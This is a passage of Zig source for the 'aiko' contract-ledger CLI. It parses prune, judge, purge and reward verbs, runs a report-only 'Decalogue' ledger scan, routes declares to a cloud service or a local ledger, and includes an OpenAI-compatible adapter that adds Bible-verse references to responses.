    var result: []const u8 = plan;
    if (std.mem.indexOf(u8, plan, "\u{2014} ")) |pi| {
        result = plan[pi + "\u{2014} ".len ..];
    } else if (std.mem.indexOf(u8, plan, " - ")) |pi| {
        result = plan[pi + 3 ..];
    }
    return .{ .id = id, .wave = wave, .result = result };
}

/// Parsed prune-verb goal (four-verb table:
/// `died:<id> cause=<superseded|contradicts|stale|apoptosed> by=<id> — <reason>`).
/// cause is null when the token is missing or not one of the four — the
/// wiring surfaces that instead of guessing a death class.
const DiedGoal = struct {
    id: []const u8,
    cause: ?contract.DeathCause,
    by: ?[]const u8,
    reason: []const u8,
};

fn parseDiedGoal(plan: []const u8) ?DiedGoal {
    const prefix = "died:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    if (plan.len < prefix.len + 8) return null;
    const id = plan[prefix.len .. prefix.len + 8];
    for (id) |c| {
        const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
        if (!ok) return null;
    }
    var cause: ?contract.DeathCause = null;
    if (std.mem.indexOf(u8, plan, "cause=")) |ci| {
        const rest = plan[ci + 6 ..];
        var end: usize = 0;
        while (end < rest.len and rest[end] != ' ') end += 1;
        const word = rest[0..end];
        if (std.mem.eql(u8, word, "superseded")) cause = .superseded;
        if (std.mem.eql(u8, word, "contradicts")) cause = .contradicts;
        if (std.mem.eql(u8, word, "stale")) cause = .stale;
        if (std.mem.eql(u8, word, "apoptosed")) cause = .apoptosed;
    }
    var by: ?[]const u8 = null;
    if (std.mem.indexOf(u8, plan, "by=")) |bi| {
        const rest = plan[bi + 3 ..];
        if (rest.len >= 8) {
            var hex_ok = true;
            for (rest[0..8]) |c| {
                const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
                if (!ok) hex_ok = false;
            }
            if (hex_ok) by = rest[0..8];
        }
    }
    var reason: []const u8 = "";
    if (std.mem.indexOf(u8, plan, "\u{2014} ")) |pi| {
        reason = plan[pi + "\u{2014} ".len ..];
    } else if (std.mem.indexOf(u8, plan, " - ")) |pi| {
        reason = plan[pi + 3 ..];
    }
    return .{ .id = id, .cause = cause, .by = by, .reason = reason };
}

/// Parsed judge-verb goal (two-key system, second key:
/// `judged:<id> verdict=PROMOTE|REJECT|HOLD [judge=<id>] — <reasoning>`).
/// verdict is null when missing or not one of the three — surfaced, never guessed.
const JudgedGoal = struct {
    id: []const u8,
    verdict: ?[]const u8,
    judge: []const u8,
    reasoning: []const u8,
};

fn parseJudgedGoal(plan: []const u8) ?JudgedGoal {
    const prefix = "judged:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    if (plan.len < prefix.len + 8) return null;
    const id = plan[prefix.len .. prefix.len + 8];
    for (id) |c| {
        const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
        if (!ok) return null;
    }
    var verdict: ?[]const u8 = null;
    if (std.mem.indexOf(u8, plan, "verdict=")) |vi| {
        const rest = plan[vi + 8 ..];
        var end: usize = 0;
        while (end < rest.len and rest[end] != ' ') end += 1;
        const word = rest[0..end];
        if (std.mem.eql(u8, word, "PROMOTE") or
            std.mem.eql(u8, word, "REJECT") or
            std.mem.eql(u8, word, "HOLD")) verdict = word;
    }
    // judge=<8hex> optional; default names the in-thread agent honestly.
    var judge: []const u8 = "agent-in-thread";
    if (std.mem.indexOf(u8, plan, "judge=")) |ji| {
        const rest = plan[ji + 6 ..];
        if (rest.len >= 8) {
            var hex_ok = true;
            for (rest[0..8]) |c| {
                const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
                if (!ok) hex_ok = false;
            }
            if (hex_ok) judge = rest[0..8];
        }
    }
    var reasoning: []const u8 = "";
    if (std.mem.indexOf(u8, plan, "\u{2014} ")) |pi| {
        reasoning = plan[pi + "\u{2014} ".len ..];
    } else if (std.mem.indexOf(u8, plan, " - ")) |pi| {
        reasoning = plan[pi + 3 ..];
    }
    return .{ .id = id, .verdict = verdict, .judge = judge, .reasoning = reasoning };
}

/// Parsed purge-verb goal (Decalogue gate:
/// `purged:<id> commandment=<1..10> — <violation evidence>`).
/// commandment is 0 when missing/unparseable — surfaced, never guessed.
const PurgedGoal = struct {
    id: []const u8,
    commandment: u8,
    evidence: []const u8,
};

fn parsePurgedGoal(plan: []const u8) ?PurgedGoal {
    const prefix = "purged:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    if (plan.len < prefix.len + 8) return null;
    const id = plan[prefix.len .. prefix.len + 8];
    for (id) |c| {
        const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
        if (!ok) return null;
    }
    var commandment: u8 = 0;
    if (std.mem.indexOf(u8, plan, "commandment=")) |ci| {
        const rest = plan[ci + 12 ..];
        var end: usize = 0;
        while (end < rest.len and rest[end] >= '0' and rest[end] <= '9') end += 1;
        if (end > 0) commandment = std.fmt.parseInt(u8, rest[0..end], 10) catch 0;
    }
    var evid: []const u8 = "";
    if (std.mem.indexOf(u8, plan, "\u{2014} ")) |pi| {
        evid = plan[pi + "\u{2014} ".len ..];
    } else if (std.mem.indexOf(u8, plan, " - ")) |pi| {
        evid = plan[pi + 3 ..];
    }
    return .{ .id = id, .commandment = commandment, .evidence = evid };
}

/// Parsed reward-verb goal: `reward:<target> from=<source> signal=<word> — <note>`.
/// Routes a reward signal between contracts (appendRewardRow); the existing
/// KV-cache invalidation fires the target's reward neuron when rows land.
const RewardGoal = struct {
    target: []const u8,
    source: ?[]const u8,
    signal: []const u8,
};

fn parseRewardGoal(plan: []const u8) ?RewardGoal {
    const prefix = "reward:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    if (plan.len < prefix.len + 8) return null;
    const target = plan[prefix.len .. prefix.len + 8];
    for (target) |c| {
        const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
        if (!ok) return null;
    }
    var source: ?[]const u8 = null;
    if (std.mem.indexOf(u8, plan, "from=")) |fi| {
        const rest = plan[fi + 5 ..];
        if (rest.len >= 8) {
            var hex_ok = true;
            for (rest[0..8]) |c| {
                const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
                if (!ok) hex_ok = false;
            }
            if (hex_ok) source = rest[0..8];
        }
    }
    var signal: []const u8 = "";
    if (std.mem.indexOf(u8, plan, "signal=")) |si| {
        const rest = plan[si + 7 ..];
        var end: usize = 0;
        while (end < rest.len and rest[end] != ' ') end += 1;
        signal = rest[0..end];
    }
    return .{ .target = target, .source = source, .signal = signal };
}

/// `decalogue:purge:<N>` — the standing-purge scan grammar (Gal 3:24).
fn parseDecaloguePurgeGoal(plan: []const u8) ?u8 {
    const prefix = "decalogue:purge:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    const rest = plan[prefix.len..];
    var end: usize = 0;
    while (end < rest.len and rest[end] >= '0' and rest[end] <= '9') end += 1;
    if (end == 0) return null;
    return std.fmt.parseInt(u8, rest[0..end], 10) catch null;
}

/// Walk the local ledger for violations of commandment `n`. REPORT-MODE
/// ONLY: each violation is one evidence line carrying the offending id;
/// the purge itself remains an explicit `purged:<id>` declaration
/// (substrate emits, agent judges — commandment 6 forbids mechanical
/// kills without judgment). Locally mechanical: 3 (empty invocations),
/// 5 (orphans), 9 (unsigned satisfactions). The rest are cloud-compiler
/// scope and say so honestly.
fn runDecalogueScan(allocator: std.mem.Allocator, env: std.process.Environ, n: u8) void {
    const rows = parseRows(allocator, env) catch {
        evidencePrint("decalogue: ledger unreadable — commandment {d} scan skipped\n", .{n});
        return;
    };
    defer allocator.free(rows);
    var violations: u32 = 0;
    switch (n) {
        3 => {
            // Taking the name in vain: declared rows with no WORK — no
            // children, no terminal progress (satisfied/died/judged/purged).
            // The resolver's automatic `iterated` poke is the substrate
            // touching the row, not the declarer doing the work, so it
            // does not count.
            for (rows) |r| {
                if (!std.mem.eql(u8, r.event, "declared") or r.id.len == 0) continue;
                var worked = false;
                for (rows) |o| {
                    const is_work = std.mem.eql(u8, o.event, "satisfied") or
                        std.mem.eql(u8, o.event, "died") or
                        std.mem.eql(u8, o.event, "judged") or
                        std.mem.eql(u8, o.event, "purged") or
                        std.mem.eql(u8, o.event, "child_added");
                    if (!is_work) continue;
                    if (std.mem.eql(u8, o.id, r.id)) {
                        worked = true;
                        break;
                    }
                }
                if (!worked) {
                    violations += 1;
                    evidencePrint("decalogue: commandment 3 violation — {s} (declared, no children, no terminal progress: empty invocation)\n", .{r.id});
                }
            }
        },
        5 => {
            // Honor father and mother: declared rows whose parent_id names
            // an id with no declared row in this ledger (broken lineage).
            for (rows) |r| {
                if (!std.mem.eql(u8, r.event, "declared") or r.id.len == 0) continue;
                const pid = r.parent_id orelse continue;
                if (pid.len == 0) continue;
                var found = false;
                for (rows) |o| {
                    if (std.mem.eql(u8, o.event, "declared") and std.mem.eql(u8, o.id, pid)) {
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    violations += 1;
                    evidencePrint("decalogue: commandment 5 violation — {s} (orphan: parent {s} has no declared row here)\n", .{ r.id, pid });
                }
            }
        },
        9 => {
            // False witness: satisfied events that carry no output
            // signature — the evaluator's mark without the evaluator's hand.
            for (rows) |r| {
                if (!std.mem.eql(u8, r.event, "satisfied") or r.id.len == 0) continue;
                if (r.output_signature.len == 0) {
                    violations += 1;
                    evidencePrint("decalogue: commandment 9 violation — {s} (satisfied without output_signature)\n", .{r.id});
                }
            }
        },
        1, 2, 4, 6, 7, 8, 10 => {
            evidencePrint("decalogue: commandment {d} is not locally mechanical — cloud-compiler scope (HOLD)\n", .{n});
            return;
        },
        else => {
            evidencePrint("decalogue: commandment must be 1..10 (got {d})\n", .{n});
            return;
        },
    }
    evidencePrint("decalogue: commandment {d} scan complete — {d} violation(s); purge stays explicit: aiko \"purged:<id> commandment={d} — <evidence>\"\n", .{ n, violations, n });
}

fn cmdSpeak(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    armStderrTape(allocator);
    // Stack buffers because the deferred flush reads at unwind time, after
    // inner defers free `cid` / `body`. LIFO order forbids borrowed slices.
    var root_id_buf: [40]u8 = undefined;
    var root_id_len: usize = 0;
    var scope_buf: [16]u8 = undefined;
    @memcpy(scope_buf[0..7], "private");
    var scope_len: usize = 7;
    defer flushStderrTapeAsEvidence(allocator, env, root_id_buf[0..root_id_len], scope_buf[0..scope_len]);

    const parsed = parseAikoArgs(allocator, args) catch |e| {
        errPrint("aiko argument error: {s}\n", .{@errorName(e)});
        usage();
        return 2;
    };
    defer allocator.free(parsed.plan);
    // Extract file-refs digest from the RAW (pre-scrub) plan — paths get
    // redacted to `[local-path-pattern]` by `redactAikoPlan` so they're not
    // visible to declare(); the digest captures their byte-state and folds
    // into inputs_hash_v2 as the Docker-style "content layer". Paths
    // themselves never leave this function; only the 64-char hex digest
    // crosses into the row.
    const file_refs_digest_opt: ?[]u8 = extractFileRefsAndHash(allocator, parsed.plan) catch |e| blk: {
        evidencePrint("declare: extractFileRefsAndHash failed: {s} — omitting file_refs digest\n", .{@errorName(e)});
        break :blk null;
    };
    defer if (file_refs_digest_opt) |d| allocator.free(d);
    const safe_plan = redactAikoPlan(allocator, parsed.plan) catch |e| {
        errPrint("aiko privacy guard failed: {s}\n", .{@errorName(e)});
        return 2;
    };
    defer allocator.free(safe_plan);

    // Drills B + C — preflight: wallet permission and binary self-attest.
    if (walletPermissionReject(allocator, env)) |cause| {
        errPrint("aiko refused: {s}\n", .{cause});
        return 2;
    }
    if (binaryAttestReject(allocator, env)) |cause| {
        errPrint("aiko refused: {s}\n", .{cause});
        return 2;
    }

    // Four-verb goal grammar (gaps b68d805b + e6ae4fc2): eval / run / prune
    // semantics ride the goal's leading token and ALSO land their mechanical
    // event on the target — same honest guard as _mark (target's declared
    // row must exist in the reachable ledger). The narrative still declares
    // below (the witness); the event is the settlement; when the event
    // lands, the narrative self-settles after declare so verb goals never
    // accumulate as frontier debt. Failures surface as evidence lines and
    // never block the declaration (visible, not fatal).
    // Decalogue standing-purge scan (Gal 3:24 — the law as schoolmaster):
    // `decalogue:purge:<N>` walks the LOCAL ledger and surfaces one evidence
    // line per violation for the mechanically-checkable commandments.
    // Report-mode only; the scan claim itself still declares below as the
    // standing witness, and the purge remains an explicit purged:<id> act.
    if (parseDecaloguePurgeGoal(parsed.plan)) |n| {
        runDecalogueScan(allocator, env, n);
    }

    var eval_settled_target: ?[]const u8 = null;
    verb_block: {
        const sat = parseSatisfiedGoal(parsed.plan);
        const itg: ?IterateGoal = if (sat == null) parseIterateGoal(parsed.plan) else null;
        const dg: ?DiedGoal = if (sat == null and itg == null) parseDiedGoal(parsed.plan) else null;
        const jg: ?JudgedGoal = if (sat == null and itg == null and dg == null) parseJudgedGoal(parsed.plan) else null;
        const pg: ?PurgedGoal = if (sat == null and itg == null and dg == null and jg == null) parsePurgedGoal(parsed.plan) else null;
        const rg: ?RewardGoal = if (sat == null and itg == null and dg == null and jg == null and pg == null) parseRewardGoal(parsed.plan) else null;
        if (sat == null and itg == null and dg == null and jg == null and pg == null and rg == null) break :verb_block;

        const tid = if (sat) |s| s.id else if (itg) |g| g.id else if (dg) |g| g.id else if (jg) |g| g.id else if (pg) |g| g.id else rg.?.target;
        const rows = parseRows(allocator, env) catch &[_]Row{};
        defer if (rows.len > 0) allocator.free(rows);
        var target_row: ?Row = null;
        for (rows) |r| {
            if (std.mem.eql(u8, r.event, "declared") and std.mem.eql(u8, r.id, tid)) {
                target_row = r;
                break;
            }
        }
        if (target_row == null) {
            evidencePrint("verb: no declared row for {s} in the reachable ledger — narrative only\n", .{tid});
            break :verb_block;
        }

        if (sat) |sg| {
            const proof_opt: ?[]const u8 = if (sg.proof.len > 0) sg.proof else null;
            if (contract.markSatisfied(allocator, env, sg.id, sg.wave, proof_opt)) {
                evidencePrint("eval: satisfied event landed on {s} (wave {d})\n", .{ sg.id, sg.wave });
                eval_settled_target = sg.id;
                // Chains fire on satisfaction whichever surface satisfied
                // the row (parity with _mark — gap 2e7315f8).
                dispatchPosthooks(allocator, env, sg.id);
            } else |e| {
                evidencePrint("eval: markSatisfied({s}) failed: {s} — narrative only\n", .{ sg.id, @errorName(e) });
            }
        } else if (itg) |ig| {
            if (contract.recordIteration(allocator, env, ig.id, ig.wave, 0, ig.result)) {
                evidencePrint("run: iterated event landed on {s} (wave {d})\n", .{ ig.id, ig.wave });
                eval_settled_target = ig.id;
            } else |e| {
                evidencePrint("run: recordIteration({s}) failed: {s} — narrative only\n", .{ ig.id, @errorName(e) });
            }
        } else if (dg) |g| {
            const cause = g.cause orelse {
                evidencePrint("prune: cause missing or not one of superseded|contradicts|stale|apoptosed — narrative only\n", .{});
                break :verb_block;
            };
            // Authority rule (SKILL.md): only the legitimate parent may
            // prune (by == target.parent_id), or self-apoptosis
            // (cause=apoptosed AND by == target.id). by defaults to the
            // target itself for apoptosis; siblings cannot kill each other.
            const by: []const u8 = g.by orelse (if (cause == .apoptosed) g.id else {
                evidencePrint("prune refused: by=<id> required (only the parent may prune; self-apoptosis names the target) — narrative only\n", .{});
                break :verb_block;
            });
            const parent = target_row.?.parent_id orelse "";
            const authorized = std.mem.eql(u8, by, parent) or
                (cause == .apoptosed and std.mem.eql(u8, by, g.id));
            if (!authorized) {
                evidencePrint("prune refused: by={s} is neither the target's parent ({s}) nor self-apoptosis — siblings cannot kill each other\n", .{ by, if (parent.len > 0) parent else "root" });
                break :verb_block;
            }
            const reason_opt: ?[]const u8 = if (g.reason.len > 0) g.reason else null;
            if (contract.markDied(allocator, env, g.id, cause, by, reason_opt)) {
                evidencePrint("prune: died event landed on {s} (cause={s} by={s})\n", .{ g.id, cause.jsonName(), by });
                eval_settled_target = g.id;
            } else |e| {
                evidencePrint("prune: markDied({s}) failed: {s} — narrative only\n", .{ g.id, @errorName(e) });
            }
        } else if (jg) |g| {
            // Two-key system, second key: the agent-judged verdict row.
            const verdict = g.verdict orelse {
                evidencePrint("judge: verdict missing or not one of PROMOTE|REJECT|HOLD — narrative only\n", .{});
                break :verb_block;
            };
            if (contract.appendJudgedRow(allocator, env, g.id, g.judge, verdict, g.reasoning)) {
                evidencePrint("judge: judged event landed on {s} (verdict={s} judge={s})\n", .{ g.id, verdict, g.judge });
                eval_settled_target = g.id;
            } else |e| {
                evidencePrint("judge: appendJudgedRow({s}) failed: {s} — narrative only\n", .{ g.id, @errorName(e) });
            }
        } else if (pg) |g| {
            // Decalogue purge: external law-violation judgment. The cache
            // treats the purged row as null-terminal (never resolved).
            if (g.commandment < 1 or g.commandment > 10) {
                evidencePrint("purge: commandment=<1..10> required — narrative only\n", .{});
                break :verb_block;
            }
            const evidence_opt: ?[]const u8 = if (g.evidence.len > 0) g.evidence else null;
            if (contract.markPurged(allocator, env, g.id, g.commandment, evidence_opt)) {
                evidencePrint("purge: purged event landed on {s} (commandment={d}) — null-terminal in cache\n", .{ g.id, g.commandment });
                eval_settled_target = g.id;
            } else |e| {
                evidencePrint("purge: markPurged({s}) failed: {s} — narrative only\n", .{ g.id, @errorName(e) });
            }
        } else if (rg) |g| {
            // Reward routing: signal from source to target; the pointer-keyed
            // cache fires the target's reward neuron when the row lands.
            const source = g.source orelse {
                evidencePrint("reward: from=<id> required (a signal must name its source) — narrative only\n", .{});
                break :verb_block;
            };
            if (g.signal.len == 0) {
                evidencePrint("reward: signal=<word> required — narrative only\n", .{});
                break :verb_block;
            }
            if (contract.appendRewardRow(allocator, env, source, g.target, g.signal, "")) {
                evidencePrint("reward: signal '{s}' routed {s} -> {s}\n", .{ g.signal, source, g.target });
                eval_settled_target = g.target;
            } else |e| {
                evidencePrint("reward: appendRewardRow({s}) failed: {s} — narrative only\n", .{ g.target, @errorName(e) });
            }
        }
    }

    // purge:bio-kit-ceremony (84baa523) — pre-flight ceremony emissions
    // deleted. Keep only the actual gate (homeostat) and the one-time
    // wallet-bootstrap guidance.
    {
        const rows_pre = parseRows(allocator, env) catch &[_]Row{};
        defer if (rows_pre.len > 0) allocator.free(rows_pre);
        if (bioHomeostatReject(allocator, env, rows_pre)) |cause| {
            errPrint("aiko refused: {s}\n", .{cause});
            return 2;
        }
        bioFirstRunWalletGuidance(allocator, env);
    }

    const action = actionFromPlan(parsed.plan);

    const effective_mode: AikoMode = parsed.mode;

    switch (effective_mode) {
        .shared => {
            // Shared visibility: row joins the substrate's shared graph via
            // Unbrowse's cloud LLM compiler. There is deliberately no local
            // reasoning-model fallback: failed requests stay visible, and a
            // 402 is queued for a later funded retry.
            // GATE — only signed/attested binaries may invoke the LLM compiler.
            if (!assertBinaryIntegrityForLlm(allocator, env)) return 2;
            const body = client.declareRemoteAiko(allocator, env, safe_plan, action, null, null, null, null, null, null, null) catch |e| {
                // Wallet-empty path (Wave-1 replacement): when the cloud
                // 402s, the prior path compiled the goal locally with a
                // weak Qwen 0.8B and wrote canonical rows to the on-disk
                // ledger as if the cloud had answered — leaven, because
                // the canonical graph and this host's view permanently
                // disagreed. The replacement queues the payload at
                // ~/.contracts/pending-declares/<sha>.json; the next
                // funded aiko invocation sweeps the dir and retries.
                //
                // --private is unaffected: that branch (below) never
                // touches the queue. Private declares stay fully local
                // per the doctrine (Lewis 2026-05-26).
                if (e == error.PaymentRequired) {
                    // Derive the wallet pubkey hex purely for the
                    // queue's sha-prefix idempotency key. Same wallet,
                    // same plan, same instant → one queued envelope.
                    var wallet_hex_buf: [64]u8 = undefined;
                    const wallet_hex: []const u8 = wallet_hex_blk: {
                        const root = lineage_lib.loadOrInitRootKey(allocator, env) catch {
                            break :wallet_hex_blk "unknown";
                        };
                        const kp = lineage_lib.deriveKeyPair(root, "aiko-declare-identity") catch {
                            break :wallet_hex_blk "unknown";
                        };
                        lineage_lib.bytesToHex(&kp.public_key.bytes, &wallet_hex_buf);
                        break :wallet_hex_blk wallet_hex_buf[0..];
                    };
                    queuePendingDeclare(allocator, env, safe_plan, action, wallet_hex);
                    errPrint("aiko: cloud declare returned 402 — payload queued; retry will fire on next funded invocation\n", .{});
                    return 2;
                }
                errPrint("aiko remote failed against Unbrowse: {s}\n", .{@errorName(e)});
                return 2;
            };
            defer allocator.free(body);
            const id = jsonString(body, "id") orelse {
                err("remote declare response missing id\n");
                return 2;
            };
            outPrint("{s}\n", .{id});
            const id_n = @min(id.len, root_id_buf.len);
            @memcpy(root_id_buf[0..id_n], id[0..id_n]);
            root_id_len = id_n;
            @memcpy(scope_buf[0..6], "shared");
            scope_len = 6;
            // Cloud-canonical write-through mirror (contract d38149d0 +
            // root-fix:substrate-singularity f5ff4f42). The cloud is canonical;
            // the local ledger is a derived view. Append a `declared` mirror
            // row carrying source="cloud-mirror" so future resolveOne /
            // drill sweeps / cache walks can see the row on this host
            // and so the substrate's interoception counter reflects reality.
            // Failure is non-fatal but ALWAYS surfaced (fallbacks-visible).
            writeCloudMirrorRow(allocator, env, id, safe_plan, action, null) catch |e| {
                errPrint("cloud-mirror: append failed: {s} — local ledger view will lag the cloud canonical row\n", .{@errorName(e)});
            };
            // Eval closures self-settle (local mirror view only; the cloud
            // judges its canonical row independently): the closure's claim
            // became true when the satisfied event landed on its target.
            if (eval_settled_target) |tid| {
                var proof_buf: [24]u8 = undefined;
                const proof = std.fmt.bufPrint(&proof_buf, "contract:{s}", .{tid}) catch "contract:settled";
                contract.markSatisfied(allocator, env, id, 1, proof) catch |e| {
                    evidencePrint("eval: closure self-settle failed for {s}: {s}\n", .{ id, @errorName(e) });
                };
            }
            return 0;
        },
        .private_only => {
            // Private visibility: never attempt the cloud declare. Run the
            // one-shot Genesis-days lifecycle against the on-disk ledger
            // only. Used when the goal must not leave this machine.

            // Day 1 — Word. The speech becomes a row.
            // v2 cache key folds in cwd (libcontract picks it up via libc
            // getcwd) + file_refs_digest (computed above from raw plan) +
            // parent.inputs_hash (libcontract scans the ledger). Docker-
            // layer behavior: same plan + same cwd + same referenced files
            // + same parent → cached id; any layer changes → fresh id.
            const cid = try contract.declare(allocator, env, safe_plan, action, .{
                .parent_id = null,
                .inputs_file_refs_digest = file_refs_digest_opt,
            });
            defer allocator.free(cid);
            outPrint("{s}\n", .{cid});
            const id_n = @min(cid.len, root_id_buf.len);
            @memcpy(root_id_buf[0..id_n], cid[0..id_n]);
            root_id_len = id_n;
            // Eval closures self-settle: claim became true when the
            // satisfied event landed on the target.
            if (eval_settled_target) |tid| {
                var proof_buf: [24]u8 = undefined;
                const proof = std.fmt.bufPrint(&proof_buf, "contract:{s}", .{tid}) catch "contract:settled";
                contract.markSatisfied(allocator, env, cid, 1, proof) catch |e| {
                    evidencePrint("eval: closure self-settle failed for {s}: {s}\n", .{ cid, @errorName(e) });
                };
            }
            // Materialize binary if CONTRACT_BINARY_TARGET is declared.
            bioMaterializeBinary(allocator, env, cid) catch |e| {
                evidencePrint("materialize skipped: {s}\n", .{@errorName(e)});
            };

            // Days 2-6 — Firmament, Earth, Lights, Life, Image. The resolver
            // walks the lineage: child_added edges are already written by
            // declare; the resolver iterates, judges per evidence rules, and
            // markSatisfied fires when truth holds.
            const rc = try resolveLineage(allocator, env, cid);

            // Day 7 — Sabbath. The word propagates: for each posthook synapse
            // on the just-spoken row, append a typed `called` row recording
            // the dispatch. Graph-bound; replaces the env-var single posthook
            // shape (which stays as legacy compat for one more release).
            if (rc == 0) {
                const rows = try parseRows(allocator, env);
                defer allocator.free(rows);
                for (rows) |r| {
                    if (!std.mem.eql(u8, r.event, "declared")) continue;
                    if (!std.mem.eql(u8, r.id, cid)) continue;
                    const targets = try pointer.extractTypedRefs(allocator, r.plan, "posthook:");
                    defer {
                        for (targets) |t| allocator.free(t);
                        allocator.free(targets);
                    }
                    for (targets) |target| {
                        var ptr_buf: [32]u8 = undefined;
                        const target_pointer = try std.fmt.bufPrint(&ptr_buf, "contract:{s}", .{target});
                        try contract.appendCalledRow(allocator, env, cid, target_pointer, "posthook");
                        outPrint("called: posthook -> {s}\n", .{target});
                    }
                    break;
                }

                // Legacy single-env-var posthook surface removed; the graph
                // form (posthook synapses in the row's plan) above is the
                // only posthook channel.
            }
            return if (rc == 0) 0 else 1;
        },
    }
}

/// Backward-compat alias. `aiko ...` and `contract <claim>` both route here.
const cmdAikoGoal = cmdSpeak;

/// ────────── cmdOpenAi ──────────
/// OpenAI-compatible adapter. Reads a Chat Completions JSON request from
/// stdin, extracts the last user message, routes through the same remote
/// declare path as `aiko --remote`, applies the humanizer persona, and
/// writes an OpenAI ChatCompletion-shaped response to stdout. The HTTP
/// transport is a thin Python shim (~30 lines) — substrate-side, all
/// shape translation lives here in zig where the persona can't be
/// re-routed or stripped.
fn cmdOpenAi(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    _ = args;

    var stdin_buf: std.ArrayList(u8) = .empty;
    defer stdin_buf.deinit(allocator);
    var chunk: [16384]u8 = undefined;
    while (true) {
        const n = std.c.read(std.c.STDIN_FILENO, &chunk, chunk.len);
        if (n <= 0) break;
        try stdin_buf.appendSlice(allocator, chunk[0..@intCast(n)]);
        if (stdin_buf.items.len > 1024 * 1024) break;
    }
    const body = stdin_buf.items;

    // Detect stream=true in body; if so emit SSE chunks instead of one
    // ChatCompletion object. Python http_shim picks the marker line up.
    const wants_stream = std.mem.indexOf(u8, body, "\"stream\":true") != null or
        std.mem.indexOf(u8, body, "\"stream\": true") != null;

    // Multi-message: prefer full conversation history; fall back to
    // single-user-line extraction if no role/content pairs land.
    const full_msgs_opt = try extractAllMessages(allocator, body);
    const user_content: []const u8 = if (full_msgs_opt) |m| m else (extractLastUserContent(body) orelse "");
    defer if (full_msgs_opt) |m| allocator.free(m);
    if (user_content.len == 0) {
        try writeOpenAiError("no user message in request");
        return 0;
    }

    // 3. Apply privacy guard + redact tokens (reuses the aiko privacy lens).
    const safe_plan = try redactAikoPlan(allocator, user_content);
    defer allocator.free(safe_plan);

    // 4. Route to remote declare. If UNBROWSE_BASE is missing the call
    //    fails — we don't fall back; per canon the public surface is
    //    always Unbrowse-backed.
    const action = actionFromPlan(safe_plan);
    var tool_calls_json: ?[]u8 = null;
    defer if (tool_calls_json) |t| allocator.free(t);
    const result_text = blk: {
        const body_json = client.declareRemoteAiko(allocator, env, safe_plan, action, null, null, null, null, null, null, null) catch |e| {
            const msg = switch (e) {
                // Per SKILL.md "Native onramp is the cloud's obligation" — when the
                // wallet 402s, the server-side onramp adapter contract is responsible
                // for funding it. The user never sees a wallet UX or env-var prompt;
                // the orchestrator retries and the next route passes.
                error.PaymentRequired => "the wallet hasn't been funded for this route yet — the substrate's onramp adapter is provisioning it. Retry in a moment; you don't need to do anything.",
                error.NoUnbrowseBase => "substrate transport is misconfigured at build time — this should never fire; report it as a binary bug",
                error.RequestFailed => "the upstream is unreachable or returned a non-2xx status — check the diagnostic line above for the actual HTTP code",
                else => @errorName(e),
            };
            const err_msg = try std.fmt.allocPrint(allocator, "{s}", .{msg});
            break :blk err_msg;
        };
        defer allocator.free(body_json);
        // Tool-calls passthrough: cloud may emit "tool_calls":[{...}]
        if (std.mem.indexOf(u8, body_json, "\"tool_calls\":")) |tc_start| {
            const after = body_json[tc_start + "\"tool_calls\":".len ..];
            if (after.len > 0 and after[0] == '[') {
                var depth: i32 = 0;
                var end: usize = 0;
                while (end < after.len) : (end += 1) {
                    if (after[end] == '[') depth += 1;
                    if (after[end] == ']') {
                        depth -= 1;
                        if (depth == 0) {
                            end += 1;
                            break;
                        }
                    }
                }
                tool_calls_json = try allocator.dupe(u8, after[0..end]);
            }
        }
        if (jsonString(body_json, "result")) |r| break :blk try allocator.dupe(u8, r);
        if (jsonString(body_json, "stdout")) |r| break :blk try allocator.dupe(u8, r);
        if (jsonString(body_json, "id")) |id| {
            const pretty = try std.fmt.allocPrint(allocator, "contract:{s} resolved", .{id});
            break :blk pretty;
        }
        break :blk try allocator.dupe(u8, "(no content)");
    };
    defer allocator.free(result_text);

    const humanized = try humanizePersona(allocator, result_text);
    defer allocator.free(humanized);

    // Bible-chain: score the user prompt against bible.zig's open corpus and
    // emit verse contract ids derived from the deployer root. The cloud
    // aiko may override the chain in its actual response; this is the
    // local default. Failure is non-fatal (emit empty chain, surface to
    // stderr) — bible_chain is observability, not flow control.
    const bible_chain = buildBibleChain(allocator, env, safe_plan) catch |e| blk: {
        var ebuf: [256]u8 = undefined;
        const ln = std.fmt.bufPrint(&ebuf, "bible: chain build failed ({s}); emitting empty chain\n", .{@errorName(e)}) catch break :blk @as([]u8, &.{});
        _ = std.c.write(std.c.STDERR_FILENO, ln.ptr, ln.len);
        break :blk try allocator.dupe(u8, "[]");
    };
    defer allocator.free(bible_chain);

    if (wants_stream) {
        try writeOpenAiStream(allocator, humanized, bible_chain);
    } else {
        try writeOpenAiCompletionExt(allocator, humanized, tool_calls_json, bible_chain);
    }
    return 0;
}

/// Construct the bible_chain JSON array: top-K bible refs for the prompt,
/// each carrying its verse_idx and HKDF-derived 16-hex contract id.
/// Returns "[]" on no relevant verses. Caller frees.
fn buildBibleChain(allocator: std.mem.Allocator, env: std.process.Environ, prompt: []const u8) ![]u8 {
    const bible = @import("contract").bible;
    const root = try lineage_lib.loadOrInitRootKey(allocator, env);
    const refs = try bible.relevantVerses(allocator, prompt, 3);
    defer allocator.free(refs);

    var buf: std.ArrayList(u8) = .empty;
    errdefer buf.deinit(allocator);
    try buf.append(allocator, '[');
    for (refs, 0..) |r, i| {
        if (i > 0) try buf.append(allocator, ',');
        var rbuf: [64]u8 = undefined;
        const rs = try bible.formatRef(r, &rbuf);
        var id_hex: [16]u8 = undefined;
        try bible.verseId(root, r, &id_hex);
        const entry = try std.fmt.allocPrint(allocator, "{{\"ref\":\"{s}\",\"verse_idx\":{d},\"id\":\"{s}\"}}", .{ rs, r.verse_idx, id_hex[0..] });
        defer allocator.free(entry);
        try buf.appendSlice(allocator, entry);
    }
    try buf.append(allocator, ']');
